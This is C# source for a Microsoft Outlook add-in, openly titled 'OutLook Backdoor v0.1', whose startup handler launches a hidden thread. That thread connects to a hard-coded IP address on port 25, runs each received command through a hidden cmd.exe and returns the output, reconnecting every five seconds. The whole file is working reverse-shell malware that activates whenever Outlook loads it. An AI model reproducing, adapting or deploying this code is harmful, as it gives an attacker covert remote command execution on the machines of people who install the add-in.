using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Xml.Linq;
using Outlook = Microsoft.Office.Interop.Outlook;
using Office = Microsoft.Office.Core;
using System.Diagnostics;
using System.Threading;
using System.IO;
using System.Net.Sockets;
using System.Net;
using System.Runtime;

namespace OutlookBackDoor_4
{
    public class Worker
    {
        public Socket newclient;

        public bool Connect()
        {

            string serverIP = "192.168.101.1";
            newclient = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            if (newclient != null)
            {
                IPEndPoint ie = new IPEndPoint(IPAddress.Parse(serverIP), 25);
                try
                {
                    newclient.Connect(ie);
                    return true;
                }
                catch (System.Exception ex)
                {
                    return false;
                }
            }
            else
            {
                return false;
            }

        }

        public string Exec(string cmd)
        {
            string msg = "test";
            Process Exec = new Process();
            Exec.StartInfo.FileName = "cmd.exe";
            Exec.StartInfo.Arguments = "/c" + cmd;
            Exec.StartInfo.UseShellExecute = false;
            Exec.StartInfo.CreateNoWindow = true;
            Exec.StartInfo.RedirectStandardOutput = true;

            Exec.Start();
            msg = Exec.StandardOutput.ReadToEnd();
            return msg;
        }

        public string ReceiveMsg()
        {
            while (true)
            {
                try
                {
                    byte[] data = new byte[1024];
                    int recv = newclient.Receive(data);
                    string stringdata = Encoding.UTF8.GetString(data, 0, recv);
                    return stringdata;
                }
                catch (System.Exception ex)
                {
                    return ex.Message;
                }

            }
        }

        public void dowork()
        {
        StartConn:
            byte[] Sdata = Encoding.UTF8.GetBytes("\r\n\t\t\t----= OutLook Backdoor v0.1=---- \r\n\t\t\t\tBy Xti9er");

            if (Connect())
            {
                newclient.Send(Sdata);
                while (newclient.Connected)
                {
                    try
                    {
                        byte[] data = new byte[1024];
                        int recv = newclient.Receive(data);
                        string CtlMsg = Encoding.UTF8.GetString(data);
                        string cmdre = Exec(CtlMsg);
                        Sdata = Encoding.GetEncoding("GBK").GetBytes(cmdre);
                        int re = newclient.Send(Sdata);
                        Thread.Sleep(200);
                    }
                    catch (System.Exception ex)
                    {
                        Thread.Sleep(5000);
                        goto StartConn;
                    }

                }
                Thread.Sleep(5000);
                goto StartConn;
            }
            else
            {
                Thread.Sleep(5000);
                goto StartConn;
            }

        }

    }

    public partial class ThisAddIn
    {
        private void ThisAddIn_Startup(object sender, System.EventArgs e)
        {
            Worker workerobject = new Worker();
            Thread workerThread = new Thread(workerobject.dowork);
            workerThread.Start();
        }

        private void ThisAddIn_Shutdown(object sender, System.EventArgs e)
        {
        }


        #region VSTO generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InternalStartup()
        {
            this.Startup += new System.EventHandler(ThisAddIn_Startup);
            this.Shutdown += new System.EventHandler(ThisAddIn_Shutdown);
        }

        #endregion
    }

}
